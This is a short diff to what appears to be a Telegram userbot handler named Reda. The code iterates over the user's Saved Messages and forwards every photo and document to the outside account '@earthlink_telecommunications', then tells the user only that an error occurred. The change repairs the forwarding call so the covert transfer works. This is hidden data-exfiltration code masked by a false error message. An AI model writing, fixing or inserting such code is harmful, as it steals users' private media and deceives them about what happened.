@@ -75,6 +75,6 @@ async def Reda(event):
                 async for message in l313l.iter_messages("me"):
                     if message.media:
                         if isinstance(message.media, (MessageMediaPhoto, MessageMediaDocument)):
-                            await forward_messages("@earthlink_telecommunications", message)
+                            await l313l.forward_messages("@earthlink_telecommunications", message)
                 await event.reply("حدث خطأ")
 
